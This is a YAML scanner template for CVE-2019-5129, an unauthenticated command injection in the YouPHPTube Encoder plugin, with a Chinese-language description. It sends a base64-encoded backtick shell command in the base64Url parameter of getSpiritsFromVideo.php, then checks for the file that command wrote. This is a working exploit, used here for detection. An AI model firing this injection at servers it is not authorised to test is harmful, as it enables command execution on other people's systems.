expression: r0() && r1()
id: CVE-2019-5129
info:
  author: 0x_zmz
  description: "YouPHPTube Encoder 2.3 \u4E2D\u5B58\u5728\u53EF\u5229\u7528\u7684\u672A\
    \u7ECF\u8EAB\u4EFD\u9A8C\u8BC1\u7684\u547D\u4EE4\u6CE8\u5165\uFF0C\u8FD9\u662F\
    \u4E00\u4E2A\u7528\u4E8E\u5728 YouPHPTube \u4E2D\u63D0\u4F9B\u7F16\u7801\u5668\
    \u529F\u80FD\u7684\u63D2\u4EF6\u3002\u5DE7\u5C3D\u5FC3\u601D\u6784\u5EFA\u7684\
    \ Web \u8BF7\u6C42\u53EF\u80FD\u5BFC\u81F4\u5728\u670D\u52A1\u5668\u4E0A\u6267\
    \u884C\u547D\u4EE4\u3002\u653B\u51FB\u8005\u53EF\u4EE5\u53D1\u9001\u5E26\u6709\
    \u5305\u542B\u7279\u5B9A\u53C2\u6570\u7684\u53C2\u6570\u7684 Web \u8BF7\u6C42\u6765\
    \u89E6\u53D1\u8FD9\u4E9B\u6F0F\u6D1E\uFF0C\u4ECE\u800C\u53EF\u80FD\u5141\u8BB8\
    \u6CC4\u9732\u6570\u636E\u5E93\u6216\u7528\u6237\u51ED\u636E\uFF0C\u751A\u81F3\
    \u5371\u53CA\u5E95\u5C42\u64CD\u4F5C\u7CFB\u7EDF\u3002"
  name: "YouPHPTube Encoder getSpiritsFromVideo.php base64Url\u547D\u4EE4\u6CE8\u5165\
    \u6F0F\u6D1E"
  reference:
  - https://xz.aliyun.com/t/6708
  - https://talosintelligence.com/vulnerability_reports/TALOS-2019-0917
  severity: critical
rules:
  r0:
    expression: response.status == 200
    request:
      follow_redirects: true
      method: GET
      path: /objects/getSpiritsFromVideo.php?base64Url={{payload}}&format=jpg
  r1:
    expression: response.status == 200 && response.body.bcontains(bytes(content))
    request:
      follow_redirects: true
      method: GET
      path: /objects/{{fileName}}
set:
  content: randomLowercase(8)
  fileName: randomLowercase(4) + ".txt"
  payload: urlencode(base64("`echo " + content + " > " + fileName + "`"))
